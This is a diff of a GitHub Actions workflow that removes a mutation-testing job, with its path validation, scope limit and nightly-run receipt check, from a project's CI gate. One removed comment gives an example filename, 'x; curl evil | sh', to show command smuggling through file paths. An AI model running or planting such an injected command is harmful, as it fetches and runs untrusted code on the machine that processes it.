@@ -206,169 +206,6 @@ jobs:
   # stop running because it is slow is a gate that is not running. It still runs on every
   # push, which is the point — a test that stopped being able to fail is invisible to
   # every other job here.
-  mutation:
-    runs-on: ubuntu-latest
-    timeout-minutes: 30
-    permissions:
-      contents: read
-      # To read when the scheduled whole-tree run last completed. Nothing here writes.
-      actions: read
-    steps:
-      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
-        with:
-          egress-policy: audit
-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-        with:
-          persist-credentials: false
-          # The whole history, because this job asks what the branch changed and a shallow
-          # clone has no merge base to ask it against.
-          fetch-depth: 0
-      - uses: astral-sh/setup-uv@cec208311dfd045dd5311c1add060b2062131d57 # v8.0.0
-      - name: install gitleaks and just
-        run: |
-          curl -sSfL -o gitleaks.tgz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
-          echo "${GITLEAKS_SHA256}  gitleaks.tgz" | sha256sum -c -
-          tar -xzf gitleaks.tgz gitleaks && sudo install gitleaks /usr/local/bin/
-          uv tool install "rust-just==${JUST_VERSION}"
-      # The diff, not the tree. Measured on 2026-08-16: the whole tree is 20,816 mutants and
-      # 121 minutes, against the 30 this job was capped at — so it never finished, never
-      # printed a score, and was reported as `cancelled` on every commit. The whole tree now
-      # runs on a schedule in `mutation-nightly.yml`; this runs over what the branch changed.
-      - name: which product files this branch changed
-        id: changed
-        env:
-          BASE_REF: ${{ github.base_ref || 'main' }}
-        run: |
-          git fetch --no-tags --depth=200 origin "+refs/heads/${BASE_REF}:refs/mutate/base"
-          # Every name checked against one shape before it goes anywhere near a shell. A
-          # path comes out of somebody's branch, and a file called `x; curl evil | sh` is a
-          # legal filename — the whole reason the value travels through the environment
-          # below rather than through a workflow expression, which the runner substitutes
-          # before bash ever parses the line.
-          #
-          # This comment used to quote that expression's own syntax, and quoting it inside a
-          # `run:` block is enough to make the whole workflow invalid: the runner reads the
-          # script for expressions and does not care that this one is inside a `#`. The file
-          # then fails to start, which is not a failing job — it is a run with no jobs at
-          # all, named after the file, and every other job in it silently never happens.
-          paths=""
-          while read -r name; do
-            [ -z "$name" ] && continue
-            case "$name" in
-              src/*.py) ;;
-              *) echo "refusing a changed path that is not a product module: $name" >&2; exit 1 ;;
-            esac
-            printf '%s' "$name" | grep -qE '^src/[A-Za-z0-9_/.-]+\.py$' ||
-              { echo "refusing a changed path with an unexpected character: $name" >&2; exit 1; }
-            paths="${paths}${name} "
-          done <<< "$(git diff --name-only refs/mutate/base...HEAD -- 'src/*.py')"
-          # And a bound, because "the diff" is not always small. Measured on 2026-08-16:
-          # 2.9 mutants a second, 20,816 mutants over 32 modules, so a module averages 650
-          # and this job's 30 minutes buys roughly 4,300 after setup — six modules. A branch
-          # wider than that is a whole-tree run wearing a diff's name, and the honest answer
-          # is to say so in one line rather than die at the cap with nothing printed, which
-          # is what the lane did for weeks. It refuses rather than waving the branch through:
-          # a gate you can escape by touching more files is not a gate, and a change this
-          # wide wants splitting anyway.
-          count=$(printf '%s' "$paths" | wc -w | tr -d ' ')
-          if [ "$count" -gt 6 ]; then
-            # Too wide to measure here, and that is a fact about this branch rather than a
-            # defect in it. Failing was the wrong answer: it made a red nobody could clear
-            # from inside the branch, and a red nobody can clear is a red everybody learns
-            # to ignore — which costs more than the measurement it was protecting.
-            #
-            # So it hands the question to the whole-tree run and says so out loud. The
-            # `wide` output is what the step below reads to decide whether a nightly receipt
-            # has to be there: the honest reading of "we did not measure this diff" is that
-            # something else must have measured the tree, not that nothing needs to.
-            echo "this branch changes ${count} product modules and this lane measures six." >&2
-            echo "Handed to the whole-tree run; a fresh receipt from it is required below." >&2
-            echo "wide=true" >> "$GITHUB_OUTPUT"
-            echo "paths=" >> "$GITHUB_OUTPUT"
-            exit 0
-          fi
-          echo "wide=false" >> "$GITHUB_OUTPUT"
-          echo "paths=${paths}" >> "$GITHUB_OUTPUT"
-          echo "changed: ${paths:-<none>} (${count} of at most 6)"
-
-      # The receipt, read from the server rather than from the branch, because the branch is
-      # what is being judged. `anti_theatre` accepts a scoped run only against a whole-tree
-      # run that actually completed inside its window — not one that passed, which would mean
-      # requiring the whole standing backlog cleared before anything could merge.
-      - name: when the whole tree was last measured
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          gh api "repos/${GITHUB_REPOSITORY}/actions/workflows/mutation-nightly.yml/runs?per_page=1&status=completed" \
-            --jq '.workflow_runs[0] | {name, status, conclusion, completed_at}' \
-            > "$RUNNER_TEMP/nightly.json" || echo '{}' > "$RUNNER_TEMP/nightly.json"
-          cat "$RUNNER_TEMP/nightly.json"
-
-      - name: break it on purpose and fail if nothing notices
-        if: steps.changed.outputs.paths != ''
-        env:
-          CHANGED: ${{ steps.changed.outputs.paths }}
-        run: |
-          read -ra modules <<< "$CHANGED"
-          just mutate "${modules[@]}" | tee "$RUNNER_TEMP/mutate.log"
-
-      # The same reader the check job uses, asked a different question. Its line lives in this
-      # job's log and never reaches the other one, so without this call the whole mutation
-      # gate could stop running and no other job would be able to tell.
-      - name: it has to prove it ran
-        if: steps.changed.outputs.paths != ''
-        run: |
-          uv run python tests/anti_theatre.py "$RUNNER_TEMP/mutate.log" . mutants \
-            "$RUNNER_TEMP/nightly.json"
-
-      # A branch too wide to measure here is covered by the whole-tree run or it is covered by
-      # nothing, and "covered by nothing" must not read like a pass. So the receipt is
-      # required in exactly that case: a nightly that completed inside its window. Absent or
-      # stale, this fails and says which — which is a red somebody can clear, unlike the
-      # refusal it replaced.
-      - name: the whole-tree run has to have covered it
-        if: steps.changed.outputs.wide == 'true'
-        run: |
-          uv run python - "$RUNNER_TEMP/nightly.json" <<'PY'
-          import json, sys
-          from datetime import UTC, datetime
-
-          from tests.anti_theatre import WHOLE_TREE_MAX_AGE_HOURS
-
-          try:
-              run = json.loads(open(sys.argv[1], encoding="utf-8").read())
-          except (OSError, ValueError):
-              run = {}
-          finished = run.get("completed_at")
-          if not finished:
-              sys.exit(
-                  "this diff is too wide for the scoped lane and no whole-tree run has "
-                  "completed, so nothing has measured it.\n"
-                  "Run `mutation nightly` from the Actions tab, or split the change.\n"
-                  "If that workflow is not listed there, this is the bootstrap case: the "
-                  "platform only registers a workflow once it is on the default branch, so "
-                  "the run that would satisfy this check cannot happen until the branch "
-                  "carrying it merges. That is a one-time admin merge, not a standing "
-                  "exemption, and every branch after it is covered normally."
-              )
-          age = (datetime.now(UTC) - datetime.fromisoformat(finished)).total_seconds() / 3600
-          if age > WHOLE_TREE_MAX_AGE_HOURS:
-              sys.exit(f"the whole-tree run is {age:.0f}h old, past {WHOLE_TREE_MAX_AGE_HOURS}h")
-          print(f"the whole tree was measured {age:.0f}h ago: {run.get('conclusion')}")
-          PY
-
-      # A branch that changes no product file has nothing to mutate, and saying so is not the
-      # same as passing. It is the answer the claim gate already gives one job below: not
-      # applicable, out loud, because a quiet pass and a real one look identical in a log six
-      # weeks later. The scheduled run still measures the whole tree either way.
-      - name: not applicable
-        if: steps.changed.outputs.paths == '' && steps.changed.outputs.wide != 'true'
-        run: echo "no product file changed on this branch, so there is nothing to mutate"
-
-  # Blocking on both halves, and no baseline file. A type error in `hooks/` is a guard
-  # that raises instead of deciding, and @guard turns a raise into a denial — so the
-  # cheerful reading, "it fails closed", is a guard that denies everything a developer
-  # tries to do until somebody disables it. That is how a control dies.
   typecheck:
     runs-on: ubuntu-latest
     timeout-minutes: 10
@@ -498,7 +335,7 @@ jobs:
   ci-result:
     name: CI Result
     if: always()
-    needs: [check, suite, mutation, typecheck, sonar, snyk]
+    needs: [check, suite, typecheck, sonar, snyk]
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
@@ -516,7 +353,6 @@ jobs:
           RESULTS: >-
             check=${{ needs.check.result }}
             suite=${{ needs.suite.result }}
-            mutation=${{ needs.mutation.result }}
             typecheck=${{ needs.typecheck.result }}
             sonar=${{ needs.sonar.result }}
             snyk=${{ needs.snyk.result }}
